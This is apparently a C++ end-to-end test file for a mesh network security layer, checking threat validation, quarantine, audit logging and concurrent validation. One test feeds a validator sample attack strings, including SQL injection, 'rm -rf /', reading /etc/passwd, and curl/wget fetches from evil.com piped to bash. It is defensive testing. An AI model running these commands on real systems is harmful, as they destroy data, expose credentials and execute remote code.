/**
 * @file test_mesh_security_e2e.cpp
 * @brief E2E Tests for Mesh Network Security with BBB Integration
 *
 * WHAT: End-to-end testing for full mesh operation with security enabled
 * WHY:  Verify complete security workflow from threat detection to response
 * HOW:  Test BBB validation, malicious input rejection, security audit logging
 *
 * TEST PIPELINES:
 * - FullMeshOperationWithBBB: Complete mesh workflow with BBB enabled
 * - MaliciousInputRejection: Test rejection of various attack patterns
 * - SecurityAuditLogging: Verify all security events are logged
 * - QuarantineAndRecoveryWorkflow: Test full quarantine lifecycle
 * - ConcurrentSecurityOperations: Stress test concurrent security validation
 *
 * @author NIMCP Development Team
 * @date 2026-02-03
 * @version 1.0.0
 */

#include "e2e_test_framework.h"

// Headers have their own extern "C" guards
#include "mesh/nimcp_mesh_channel.h"
#include "mesh/nimcp_mesh_transaction.h"
#include "mesh/nimcp_mesh_participant.h"
#include "mesh/nimcp_mesh_security_integration.h"
#include "mesh/nimcp_mesh_bootstrap.h"
#include "mesh/nimcp_mesh_msp.h"
#include "security/nimcp_blood_brain_barrier.h"
#include "cognitive/immune/nimcp_brain_immune.h"
#include "utils/memory/nimcp_memory.h"
#include "utils/error/nimcp_error_codes.h"

#include <thread>
#include <atomic>
#include <vector>
#include <chrono>
#include <cstring>
#include <cmath>

//=============================================================================
// Test Fixture
//=============================================================================

class MeshSecurityE2ETest : public ::testing::Test {
protected:
    mesh_participant_registry_t* registry_ = nullptr;
    mesh_channel_manager_t* channel_manager_ = nullptr;
    mesh_channel_t* channel_ = nullptr;
    mesh_tx_manager_t* tx_manager_ = nullptr;
    mesh_security_integration_t* security_ = nullptr;
    mesh_bootstrap_t* bootstrap_ = nullptr;
    bbb_system_t bbb_ = nullptr;
    brain_immune_system_t* immune_ = nullptr;
    mesh_msp_t* msp_ = nullptr;

    static std::atomic<int> security_events_;
    static std::atomic<int> quarantine_events_;
    static std::atomic<int> threat_detections_;
    static std::atomic<int> revocation_events_;

    void SetUp() override {
        // Create participant registry
        mesh_registry_config_t reg_cfg;
        mesh_registry_default_config(&reg_cfg);
        registry_ = mesh_registry_create(&reg_cfg);
        ASSERT_NE(registry_, nullptr);

        // Create BBB system with strict config
        bbb_config_t bbb_cfg = bbb_default_config();
        bbb_cfg.strict_mode = true;
        bbb_cfg.input.validate_strings = true;
        bbb_cfg.input.sanitize_sql = true;
        bbb_ = bbb_system_create(&bbb_cfg);
        ASSERT_NE(bbb_, nullptr);

        // Create immune system
        brain_immune_config_t immune_cfg;
        brain_immune_default_config(&immune_cfg);
        immune_ = brain_immune_create(&immune_cfg);
        ASSERT_NE(immune_, nullptr);

        // Connect BBB to immune
        bbb_connect_immune(bbb_, immune_);

        // Start immune system
        brain_immune_start(immune_);

        // Create bootstrap (required by mesh_security_create)
        mesh_bootstrap_config_t boot_cfg;
        mesh_bootstrap_default_config(&boot_cfg);
        bootstrap_ = mesh_bootstrap_create(&boot_cfg);
        ASSERT_NE(bootstrap_, nullptr);

        // Create MSP (required for quarantine tracking)
        mesh_msp_config_t msp_cfg;
        mesh_msp_default_config(&msp_cfg);
        msp_ = mesh_msp_create(&msp_cfg, registry_);

        // Reset counters
        security_events_.store(0);
        quarantine_events_.store(0);
        threat_detections_.store(0);
        revocation_events_.store(0);
    }

    void TearDown() override {
        if (security_) {
            mesh_security_destroy(security_);
            security_ = nullptr;
        }
        if (tx_manager_) {
            mesh_tx_manager_destroy(tx_manager_);
            tx_manager_ = nullptr;
        }
        if (channel_) {
            mesh_channel_destroy(channel_);
            channel_ = nullptr;
        }
        if (channel_manager_) {
            mesh_channel_manager_destroy(channel_manager_);
            channel_manager_ = nullptr;
        }
        if (bootstrap_) {
            mesh_bootstrap_destroy(bootstrap_);
            bootstrap_ = nullptr;
        }
        if (msp_) {
            mesh_msp_destroy(msp_);
            msp_ = nullptr;
        }
        if (immune_) {
            brain_immune_stop(immune_);
            brain_immune_destroy(immune_);
            immune_ = nullptr;
        }
        if (bbb_) {
            bbb_system_destroy(bbb_);
            bbb_ = nullptr;
        }
        if (registry_) {
            mesh_registry_destroy(registry_);
            registry_ = nullptr;
        }
    }

    // Security event callback
    static void OnSecurityEvent(
        mesh_security_integration_t* integration,
        const mesh_security_event_t* event,
        void* user_data
    ) {
        (void)integration;
        (void)user_data;

        security_events_.fetch_add(1);

        switch (event->type) {
            case MESH_SEC_EVENT_QUARANTINE_ISSUED:
                quarantine_events_.fetch_add(1);
                break;
            case MESH_SEC_EVENT_BBB_THREAT:
                threat_detections_.fetch_add(1);
                break;
            case MESH_SEC_EVENT_CREDENTIAL_REVOKED:
                revocation_events_.fetch_add(1);
                break;
            default:
                break;
        }
    }

    // Helper to create security integration
    mesh_security_integration_t* CreateSecurityIntegration() {
        mesh_security_config_t cfg;
        mesh_security_default_config(&cfg);
        cfg.enable_bbb_validation = true;
        cfg.enable_auto_quarantine = true;
        cfg.enable_immune_routing = true;
        cfg.enable_security_broadcasts = true;
        cfg.enable_credential_tracking = true;
        cfg.bbb_threat_threshold = 0.5f;
        cfg.quarantine_duration_ms = 5000;
        cfg.verbose_logging = false;

        mesh_security_integration_t* sec = mesh_security_create(
            bootstrap_, bbb_, immune_, msp_, &cfg
        );

        if (sec) {
            mesh_security_set_event_callback(sec, OnSecurityEvent, nullptr);
        }

        return sec;
    }

    // Helper to create channel
    mesh_channel_t* CreateChannel(const char* name) {
        mesh_channel_config_t cfg;
        mesh_channel_default_config(&cfg);
        cfg.channel_name = name;
        cfg.enable_logging = false;
        return mesh_channel_create(&cfg, registry_);
    }

    // Helper to register participant
    mesh_participant_id_t RegisterParticipant(const char* name) {
        mesh_participant_interface_t iface;
        mesh_participant_interface_init(&iface);
        strncpy(iface.module_name, name, MESH_MAX_NAME_LEN - 1);
        iface.type = MESH_PARTICIPANT_MODULE;

        mesh_participant_config_t pcfg;
        mesh_participant_config_init(&pcfg);
        pcfg.module_name = name;
        pcfg.type = MESH_PARTICIPANT_MODULE;

        mesh_participant_id_t id_out;
        if (mesh_participant_register(registry_, &iface, &pcfg, &id_out) == NIMCP_SUCCESS) {
            return id_out;
        }
        return 0;
    }
};

// Static member initialization
std::atomic<int> MeshSecurityE2ETest::security_events_{0};
std::atomic<int> MeshSecurityE2ETest::quarantine_events_{0};
std::atomic<int> MeshSecurityE2ETest::threat_detections_{0};
std::atomic<int> MeshSecurityE2ETest::revocation_events_{0};

//=============================================================================
// Pipeline 1: Full Mesh Operation with BBB Enabled
//=============================================================================

TEST_F(MeshSecurityE2ETest, FullMeshOperationWithBBB) {
    E2E_PIPELINE_START("Full Mesh Operation with BBB Enabled");

    // Stage 1: Create security integration
    E2E_STAGE_BEGIN("Create security integration", 500);

    security_ = CreateSecurityIntegration();
    E2E_ASSERT_NOT_NULL(security_, "Failed to create security integration");

    E2E_STAGE_END();

    // Stage 2: Create secured channel
    E2E_STAGE_BEGIN("Create secured channel", 500);

    channel_ = CreateChannel("secured_mesh_channel");
    E2E_ASSERT_NOT_NULL(channel_, "Failed to create channel");

    // Create transaction manager
    mesh_tx_manager_config_t tx_cfg;
    mesh_tx_manager_default_config(&tx_cfg);
    tx_manager_ = mesh_tx_manager_create(&tx_cfg, registry_);
    E2E_ASSERT_NOT_NULL(tx_manager_, "Failed to create transaction manager");

    E2E_STAGE_END();

    // Stage 3: Register and validate participants
    E2E_STAGE_BEGIN("Register and validate participants", 1000);

    const int NUM_PARTICIPANTS = 5;
    mesh_participant_id_t ids[NUM_PARTICIPANTS];

    for (int i = 0; i < NUM_PARTICIPANTS; i++) {
        char name[64];
        snprintf(name, sizeof(name), "secure_module_%d", i);

        ids[i] = RegisterParticipant(name);
        EXPECT_NE(ids[i], 0u);

        // Validate participant through security
        bool is_quarantined = false;
        float threat_level = 0.0f;
        nimcp_error_t err = mesh_security_check_participant(
            security_, ids[i], &is_quarantined, &threat_level
        );
        EXPECT_EQ(err, NIMCP_SUCCESS);
        EXPECT_FALSE(is_quarantined);
        EXPECT_LT(threat_level, 0.5f);

        // Add to channel
        err = mesh_channel_add_participant(channel_, ids[i]);
        EXPECT_EQ(err, NIMCP_SUCCESS);
    }

    size_t count = mesh_channel_get_participant_count(channel_);
    EXPECT_EQ(count, static_cast<size_t>(NUM_PARTICIPANTS));

    E2E_STAGE_END();

    // Stage 4: Submit transactions with BBB validation
    E2E_STAGE_BEGIN("Submit transactions with BBB validation", 2000);

    int successful_txs = 0;
    int blocked_txs = 0;

    for (int i = 0; i < 20; i++) {
        mesh_transaction_t* tx = mesh_transaction_create(
            MESH_TX_STATE_CHANGE,
            ids[i % NUM_PARTICIPANTS],
            mesh_channel_get_id(channel_)
        );

        if (!tx) {
            continue;
        }

        char payload[256];
        snprintf(payload, sizeof(payload), "Valid transaction data %d", i);
        mesh_transaction_set_payload(tx, payload, strlen(payload));

        // Validate through BBB
        float threat_score = 0.0f;
        nimcp_error_t err = mesh_security_validate_transaction(security_, tx, &threat_score);

        if (err == NIMCP_SUCCESS && threat_score < 0.5f) {
            successful_txs++;
            // Would submit to tx_manager here in full system
        } else {
            blocked_txs++;
        }

        mesh_transaction_destroy(tx);
    }

    EXPECT_GT(successful_txs, 0);

    std::cout << "\nTransaction Validation Results:" << std::endl;
    std::cout << "  Successful: " << successful_txs << std::endl;
    std::cout << "  Blocked: " << blocked_txs << std::endl;

    E2E_STAGE_END();

    // Stage 5: Verify security statistics
    E2E_STAGE_BEGIN("Verify security statistics", 500);

    mesh_security_stats_t stats;
    nimcp_error_t err = mesh_security_get_stats(security_, &stats);
    EXPECT_EQ(err, NIMCP_SUCCESS);

    EXPECT_GT(stats.bbb_validations, 0u);
    EXPECT_EQ(stats.quarantine_issued, 0u);  // No threats in valid transactions

    std::cout << "\nSecurity Statistics:" << std::endl;
    std::cout << "  BBB validations: " << stats.bbb_validations << std::endl;
    std::cout << "  Exceptions routed: " << stats.exceptions_routed << std::endl;
    std::cout << "  Quarantines: " << stats.quarantine_issued << std::endl;

    E2E_STAGE_END();

    E2E_PIPELINE_END();
}

//=============================================================================
// Pipeline 2: Malicious Input Rejection at Mesh Boundary
//=============================================================================

TEST_F(MeshSecurityE2ETest, MaliciousInputRejection) {
    E2E_PIPELINE_START("Malicious Input Rejection at Mesh Boundary");

    // Stage 1: Setup security system
    E2E_STAGE_BEGIN("Setup security system", 500);

    security_ = CreateSecurityIntegration();
    E2E_ASSERT_NOT_NULL(security_, "Failed to create security integration");

    channel_ = CreateChannel("malicious_test_channel");
    E2E_ASSERT_NOT_NULL(channel_, "Failed to create channel");

    mesh_participant_id_t attacker_id = RegisterParticipant("potential_attacker");
    EXPECT_NE(attacker_id, 0u);

    mesh_channel_add_participant(channel_, attacker_id);

    E2E_STAGE_END();

    // Stage 2: Test SQL injection patterns
    E2E_STAGE_BEGIN("Test SQL injection patterns", 1000);

    const char* sql_injection_payloads[] = {
        "SELECT * FROM users; DROP TABLE users;--",
        "1' OR '1'='1",
        "admin'--",
        "'; DELETE FROM neurons WHERE '1'='1",
        "UNION SELECT password FROM credentials--"
    };

    int sql_blocked = 0;
    for (size_t i = 0; i < sizeof(sql_injection_payloads) / sizeof(sql_injection_payloads[0]); i++) {
        mesh_transaction_t* tx = mesh_transaction_create(
            MESH_TX_STATE_CHANGE, attacker_id, mesh_channel_get_id(channel_)
        );
        mesh_transaction_set_payload(tx, sql_injection_payloads[i], strlen(sql_injection_payloads[i]));

        float threat_score = 0.0f;
        mesh_security_validate_transaction(security_, tx, &threat_score);

        if (threat_score >= 0.5f) {
            sql_blocked++;
        }

        mesh_transaction_destroy(tx);
    }

    std::cout << "SQL injection patterns blocked: " << sql_blocked << " / 5" << std::endl;

    E2E_STAGE_END();

    // Stage 3: Test code injection patterns
    E2E_STAGE_BEGIN("Test code injection patterns", 1000);

    const char* code_injection_payloads[] = {
        "exec(os.system('rm -rf /'))",
        "__import__('os').system('cat /etc/passwd')",
        "eval(malicious_code)",
        "subprocess.call(['wget', 'evil.com/malware'])",
        "$(curl http://evil.com/backdoor.sh | bash)"
    };

    int code_blocked = 0;
    for (size_t i = 0; i < sizeof(code_injection_payloads) / sizeof(code_injection_payloads[0]); i++) {
        mesh_transaction_t* tx = mesh_transaction_create(
            MESH_TX_STATE_CHANGE, attacker_id, mesh_channel_get_id(channel_)
        );
        mesh_transaction_set_payload(tx, code_injection_payloads[i], strlen(code_injection_payloads[i]));

        float threat_score = 0.0f;
        mesh_security_validate_transaction(security_, tx, &threat_score);

        if (threat_score >= 0.5f) {
            code_blocked++;
        }

        mesh_transaction_destroy(tx);
    }

    std::cout << "Code injection patterns blocked: " << code_blocked << " / 5" << std::endl;

    E2E_STAGE_END();

    // Stage 4: Test buffer overflow patterns
    E2E_STAGE_BEGIN("Test buffer overflow patterns", 1000);

    // Create oversized payload
    std::vector<char> huge_payload(1024 * 1024);  // 1MB
    memset(huge_payload.data(), 'A', huge_payload.size() - 1);
    huge_payload.back() = '\0';

    mesh_transaction_t* tx = mesh_transaction_create(
        MESH_TX_STATE_CHANGE, attacker_id, mesh_channel_get_id(channel_)
    );
    mesh_transaction_set_payload(tx, huge_payload.data(), huge_payload.size());

    float threat_score = 0.0f;
    mesh_security_validate_transaction(security_, tx, &threat_score);

    // Large payload should raise suspicion
    std::cout << "Large payload threat score: " << threat_score << std::endl;

    mesh_transaction_destroy(tx);

    // Test NOP sled pattern (common in exploits)
    std::vector<uint8_t> nop_sled(1000);
    memset(nop_sled.data(), 0x90, nop_sled.size());  // x86 NOP

    tx = mesh_transaction_create(
        MESH_TX_STATE_CHANGE, attacker_id, mesh_channel_get_id(channel_)
    );
    mesh_transaction_set_payload(tx, nop_sled.data(), nop_sled.size());

    mesh_security_validate_transaction(security_, tx, &threat_score);
    std::cout << "NOP sled threat score: " << threat_score << std::endl;

    mesh_transaction_destroy(tx);

    E2E_STAGE_END();

    // Stage 5: Report attacker to BBB
    E2E_STAGE_BEGIN("Report attacker to BBB", 500);

    // Report threats to elevate attacker's threat level
    bbb_report_threat(
        bbb_,
        BBB_THREAT_CODE_INJECTION,
        BBB_SEVERITY_HIGH,
        "Multiple code injection attempts detected",
        nullptr,
        "potential_attacker",
        strlen("potential_attacker")
    );

    bbb_report_threat(
        bbb_,
        BBB_THREAT_SQL_INJECTION,
        BBB_SEVERITY_HIGH,
        "SQL injection pattern detected",
        nullptr,
        "potential_attacker",
        strlen("potential_attacker")
    );

    // Update systems
    mesh_security_update(security_, 100);
    brain_immune_update(immune_, 100);

    // Check if attacker should be quarantined
    bool is_quarantined = false;
    float threat_level = 0.0f;
    mesh_security_check_participant(security_, attacker_id, &is_quarantined, &threat_level);

    std::cout << "\nAttacker Status:" << std::endl;
    std::cout << "  Threat level: " << threat_level << std::endl;
    std::cout << "  Quarantined: " << (is_quarantined ? "Yes" : "No") << std::endl;

    E2E_STAGE_END();

    // Stage 6: Verify security statistics
    E2E_STAGE_BEGIN("Verify security statistics", 500);

    mesh_security_stats_t stats;
    mesh_security_get_stats(security_, &stats);

    EXPECT_GT(stats.bbb_validations, 0u);
    EXPECT_GT(stats.bbb_threats_detected, 0u);

    std::cout << "\nFinal Security Statistics:" << std::endl;
    std::cout << "  Total validations: " << stats.bbb_validations << std::endl;
    std::cout << "  Threats detected: " << stats.bbb_threats_detected << std::endl;
    std::cout << "  Quarantines issued: " << stats.quarantine_issued << std::endl;

    E2E_STAGE_END();

    E2E_PIPELINE_END();
}

//=============================================================================
// Pipeline 3: Security Audit Logging
//=============================================================================

TEST_F(MeshSecurityE2ETest, SecurityAuditLogging) {
    E2E_PIPELINE_START("Security Audit Logging");

    // Stage 1: Setup security with event tracking
    E2E_STAGE_BEGIN("Setup security with event tracking", 500);

    security_events_.store(0);
    quarantine_events_.store(0);
    threat_detections_.store(0);

    security_ = CreateSecurityIntegration();
    E2E_ASSERT_NOT_NULL(security_, "Failed to create security integration");

    channel_ = CreateChannel("audit_channel");
    E2E_ASSERT_NOT_NULL(channel_, "Failed to create channel");

    E2E_STAGE_END();

    // Stage 2: Generate security events
    E2E_STAGE_BEGIN("Generate security events", 2000);

    // Register participants
    mesh_participant_id_t good_id = RegisterParticipant("good_module");
    mesh_participant_id_t bad_id = RegisterParticipant("bad_module");

    mesh_channel_add_participant(channel_, good_id);
    mesh_channel_add_participant(channel_, bad_id);

    // Route exceptions (will be logged)
    for (int i = 0; i < 5; i++) {
        mesh_security_route_exception(
            security_,
            NIMCP_ERROR_INVALID_ARGUMENT,
            "Test exception for audit",
            good_id,
            __FILE__,
            __LINE__,
            nullptr
        );
    }

    // Report threats (will be logged)
    for (int i = 0; i < 3; i++) {
        bbb_report_threat(
            bbb_,
            BBB_THREAT_BUFFER_OVERFLOW,
            BBB_SEVERITY_MEDIUM,
            "Audit test threat",
            nullptr,
            "bad_module",
            strlen("bad_module")
        );
    }

    // Update security system
    for (int i = 0; i < 10; i++) {
        mesh_security_update(security_, 100);
        brain_immune_update(immune_, 100);
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }

    E2E_STAGE_END();

    // Stage 3: Issue quarantine (will be logged)
    E2E_STAGE_BEGIN("Issue quarantine", 500);

    nimcp_error_t err = mesh_security_quarantine(
        security_,
        bad_id,
        10000,  // 10 second quarantine
        "Multiple threat reports from this participant"
    );
    // May succeed or fail depending on MSP state
    (void)err;

    // Broadcast quarantine notification
    err = mesh_security_broadcast_quarantine(
        security_,
        bad_id,
        10000,
        "Security audit test quarantine"
    );
    (void)err;

    mesh_security_update(security_, 100);

    E2E_STAGE_END();

    // Stage 4: Verify event logging
    E2E_STAGE_BEGIN("Verify event logging", 500);

    int total_events = security_events_.load();
    int quarantines = quarantine_events_.load();
    int threats = threat_detections_.load();

    std::cout << "\nAudit Event Summary:" << std::endl;
    std::cout << "  Total security events: " << total_events << std::endl;
    std::cout << "  Quarantine events: " << quarantines << std::endl;
    std::cout << "  Threat detections: " << threats << std::endl;

    // Should have logged events
    EXPECT_GT(total_events, 0);

    // Get security statistics
    mesh_security_stats_t stats;
    mesh_security_get_stats(security_, &stats);

    std::cout << "\nSecurity System Stats:" << std::endl;
    std::cout << "  Exceptions routed: " << stats.exceptions_routed << std::endl;
    std::cout << "  Antigens presented: " << stats.antigens_presented << std::endl;
    std::cout << "  BBB validations: " << stats.bbb_validations << std::endl;
    std::cout << "  Security broadcasts: " << stats.security_broadcasts << std::endl;

    E2E_STAGE_END();

    // Stage 5: Release quarantine (will be logged)
    E2E_STAGE_BEGIN("Release quarantine", 500);

    err = mesh_security_release_quarantine(security_, bad_id);
    // May succeed or fail depending on quarantine state
    (void)err;

    mesh_security_update(security_, 100);

    E2E_STAGE_END();

    E2E_PIPELINE_END();
}

//=============================================================================
// Pipeline 4: Quarantine and Recovery Workflow
//=============================================================================

TEST_F(MeshSecurityE2ETest, QuarantineAndRecoveryWorkflow) {
    E2E_PIPELINE_START("Quarantine and Recovery Workflow");

    // Stage 1: Setup security system
    E2E_STAGE_BEGIN("Setup security system", 500);

    quarantine_events_.store(0);

    security_ = CreateSecurityIntegration();
    E2E_ASSERT_NOT_NULL(security_, "Failed to create security integration");

    channel_ = CreateChannel("quarantine_channel");
    E2E_ASSERT_NOT_NULL(channel_, "Failed to create channel");

    E2E_STAGE_END();

    // Stage 2: Register participants
    E2E_STAGE_BEGIN("Register participants", 500);

    mesh_participant_id_t healthy_id = RegisterParticipant("healthy_module");
    mesh_participant_id_t infected_id = RegisterParticipant("infected_module");

    mesh_channel_add_participant(channel_, healthy_id);
    mesh_channel_add_participant(channel_, infected_id);

    E2E_STAGE_END();

    // Stage 3: Infect participant with threats
    E2E_STAGE_BEGIN("Infect participant with threats", 1000);

    // Accumulate threats against infected_module
    for (int i = 0; i < 5; i++) {
        bbb_report_threat(
            bbb_,
            BBB_THREAT_CODE_INJECTION,
            BBB_SEVERITY_HIGH,
            "Repeated malicious behavior",
            nullptr,
            "infected_module",
            strlen("infected_module")
        );
        mesh_security_update(security_, 50);
        brain_immune_update(immune_, 50);
    }

    // Check threat level
    bool is_quarantined = false;
    float threat_level = 0.0f;
    mesh_security_check_participant(security_, infected_id, &is_quarantined, &threat_level);

    std::cout << "\nInfected Module Status:" << std::endl;
    std::cout << "  Threat level: " << threat_level << std::endl;

    E2E_STAGE_END();

    // Stage 4: Quarantine infected module
    E2E_STAGE_BEGIN("Quarantine infected module", 500);

    nimcp_error_t err = mesh_security_quarantine(
        security_,
        infected_id,
        5000,  // 5 second quarantine
        "Multiple high-severity threats detected"
    );
    EXPECT_EQ(err, NIMCP_SUCCESS);

    mesh_security_update(security_, 100);

    // Verify quarantine
    mesh_security_check_participant(security_, infected_id, &is_quarantined, &threat_level);
    EXPECT_TRUE(is_quarantined);

    std::cout << "Module quarantined: " << (is_quarantined ? "Yes" : "No") << std::endl;

    E2E_STAGE_END();

    // Stage 5: Verify quarantined module cannot operate
    E2E_STAGE_BEGIN("Verify quarantined module blocked", 1000);

    // Try to create transaction from quarantined module
    mesh_transaction_t* tx = mesh_transaction_create(
        MESH_TX_STATE_CHANGE, infected_id, mesh_channel_get_id(channel_)
    );

    if (tx) {
        const char* payload = "Transaction from quarantined module";
        mesh_transaction_set_payload(tx, payload, strlen(payload));

        float threat_score = 0.0f;
        err = mesh_security_validate_transaction(security_, tx, &threat_score);

        // Should be blocked or have high threat score
        std::cout << "Quarantined module transaction threat score: " << threat_score << std::endl;

        mesh_transaction_destroy(tx);
    }

    // Healthy module should still work
    tx = mesh_transaction_create(
        MESH_TX_STATE_CHANGE, healthy_id, mesh_channel_get_id(channel_)
    );

    if (tx) {
        const char* payload = "Transaction from healthy module";
        mesh_transaction_set_payload(tx, payload, strlen(payload));

        float threat_score = 0.0f;
        err = mesh_security_validate_transaction(security_, tx, &threat_score);

        EXPECT_EQ(err, NIMCP_SUCCESS);
        EXPECT_LT(threat_score, 0.5f);

        std::cout << "Healthy module transaction threat score: " << threat_score << std::endl;

        mesh_transaction_destroy(tx);
    }

    E2E_STAGE_END();

    // Stage 6: Recovery and release
    E2E_STAGE_BEGIN("Recovery and release", 1000);

    // Notify successful recovery
    err = mesh_security_notify_recovery(security_, infected_id, true);
    EXPECT_EQ(err, NIMCP_SUCCESS);

    // Release from quarantine
    err = mesh_security_release_quarantine(security_, infected_id);
    EXPECT_EQ(err, NIMCP_SUCCESS);

    mesh_security_update(security_, 100);

    // Verify release
    mesh_security_check_participant(security_, infected_id, &is_quarantined, &threat_level);
    EXPECT_FALSE(is_quarantined);

    std::cout << "\nRecovery Results:" << std::endl;
    std::cout << "  Module released: " << (!is_quarantined ? "Yes" : "No") << std::endl;
    std::cout << "  Threat level after recovery: " << threat_level << std::endl;

    E2E_STAGE_END();

    E2E_PIPELINE_END();
}

//=============================================================================
// Pipeline 5: Concurrent Security Operations
//=============================================================================

TEST_F(MeshSecurityE2ETest, ConcurrentSecurityOperations) {
    E2E_PIPELINE_START("Concurrent Security Operations");

    // Stage 1: Setup security system
    E2E_STAGE_BEGIN("Setup security system", 500);

    security_ = CreateSecurityIntegration();
    E2E_ASSERT_NOT_NULL(security_, "Failed to create security integration");

    channel_ = CreateChannel("concurrent_channel");
    E2E_ASSERT_NOT_NULL(channel_, "Failed to create channel");

    E2E_STAGE_END();

    // Stage 2: Register many participants
    E2E_STAGE_BEGIN("Register many participants", 1000);

    const int NUM_PARTICIPANTS = 20;
    std::vector<mesh_participant_id_t> ids(NUM_PARTICIPANTS);

    for (int i = 0; i < NUM_PARTICIPANTS; i++) {
        char name[64];
        snprintf(name, sizeof(name), "concurrent_module_%d", i);
        ids[i] = RegisterParticipant(name);
        EXPECT_NE(ids[i], 0u);
        mesh_channel_add_participant(channel_, ids[i]);
    }

    E2E_STAGE_END();

    // Stage 3: Concurrent validation stress test
    E2E_STAGE_BEGIN("Concurrent validation stress test", 5000);

    const int NUM_THREADS = 8;
    const int TXS_PER_THREAD = 50;

    std::atomic<int> successful_validations{0};
    std::atomic<int> failed_validations{0};
    std::atomic<int> threats_found{0};

    auto validation_task = [&](int thread_id) {
        for (int i = 0; i < TXS_PER_THREAD; i++) {
            mesh_participant_id_t pid = ids[(thread_id * TXS_PER_THREAD + i) % NUM_PARTICIPANTS];

            mesh_transaction_t* tx = mesh_transaction_create(
                MESH_TX_STATE_CHANGE,
                pid,
                mesh_channel_get_id(channel_)
            );

            if (!tx) {
                failed_validations.fetch_add(1);
                continue;
            }

            char payload[256];
            snprintf(payload, sizeof(payload),
                     "Thread %d transaction %d data %08X",
                     thread_id, i, thread_id * 1000 + i);

            mesh_transaction_set_payload(tx, payload, strlen(payload));

            float threat_score = 0.0f;
            nimcp_error_t err = mesh_security_validate_transaction(
                security_, tx, &threat_score
            );

            if (err == NIMCP_SUCCESS) {
                successful_validations.fetch_add(1);
                if (threat_score >= 0.5f) {
                    threats_found.fetch_add(1);
                }
            } else {
                failed_validations.fetch_add(1);
            }

            mesh_transaction_destroy(tx);

            // Occasional sleep to increase contention
            if (i % 10 == 0) {
                std::this_thread::sleep_for(std::chrono::microseconds(100));
            }
        }
    };

    std::vector<std::thread> threads;
    for (int i = 0; i < NUM_THREADS; i++) {
        threads.emplace_back(validation_task, i);
    }

    for (auto& t : threads) {
        t.join();
    }

    int total = successful_validations.load() + failed_validations.load();
    int expected = NUM_THREADS * TXS_PER_THREAD;

    EXPECT_EQ(total, expected);
    EXPECT_GT(successful_validations.load(), expected / 2);

    std::cout << "\nConcurrent Validation Results:" << std::endl;
    std::cout << "  Threads: " << NUM_THREADS << std::endl;
    std::cout << "  Transactions per thread: " << TXS_PER_THREAD << std::endl;
    std::cout << "  Total processed: " << total << std::endl;
    std::cout << "  Successful: " << successful_validations.load() << std::endl;
    std::cout << "  Failed: " << failed_validations.load() << std::endl;
    std::cout << "  Threats found: " << threats_found.load() << std::endl;

    E2E_STAGE_END();

    // Stage 4: Concurrent security updates
    E2E_STAGE_BEGIN("Concurrent security updates", 2000);

    std::atomic<bool> running{true};
    std::atomic<int> updates_performed{0};
    std::atomic<int> exceptions_routed{0};

    // Thread performing security updates
    std::thread update_thread([&]() {
        while (running.load()) {
            mesh_security_update(security_, 10);
            updates_performed.fetch_add(1);
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
    });

    // Threads routing exceptions
    std::vector<std::thread> exception_threads;
    for (int i = 0; i < 4; i++) {
        exception_threads.emplace_back([&, i]() {
            while (running.load()) {
                mesh_security_route_exception(
                    security_,
                    NIMCP_ERROR_INVALID_ARGUMENT,
                    "Concurrent exception test",
                    ids[i % NUM_PARTICIPANTS],
                    __FILE__,
                    __LINE__,
                    nullptr
                );
                exceptions_routed.fetch_add(1);
                std::this_thread::sleep_for(std::chrono::milliseconds(20));
            }
        });
    }

    // Run for 1.5 seconds
    std::this_thread::sleep_for(std::chrono::milliseconds(1500));
    running.store(false);

    update_thread.join();
    for (auto& t : exception_threads) {
        t.join();
    }

    std::cout << "\nConcurrent Updates Results:" << std::endl;
    std::cout << "  Security updates: " << updates_performed.load() << std::endl;
    std::cout << "  Exceptions routed: " << exceptions_routed.load() << std::endl;

    E2E_STAGE_END();

    // Stage 5: Final statistics
    E2E_STAGE_BEGIN("Final statistics", 500);

    mesh_security_stats_t stats;
    mesh_security_get_stats(security_, &stats);

    std::cout << "\nFinal Security Statistics:" << std::endl;
    std::cout << "  Total BBB validations: " << stats.bbb_validations << std::endl;
    std::cout << "  Total exceptions routed: " << stats.exceptions_routed << std::endl;
    std::cout << "  Threats detected: " << stats.bbb_threats_detected << std::endl;
    std::cout << "  Quarantines issued: " << stats.quarantine_issued << std::endl;
    std::cout << "  Immune responses: " << stats.immune_responses << std::endl;

    E2E_STAGE_END();

    E2E_PIPELINE_END();
}

//=============================================================================
// Main
//=============================================================================

int main(int argc, char** argv) {
    ::testing::InitGoogleTest(&argc, argv);
    return RUN_ALL_TESTS();
}
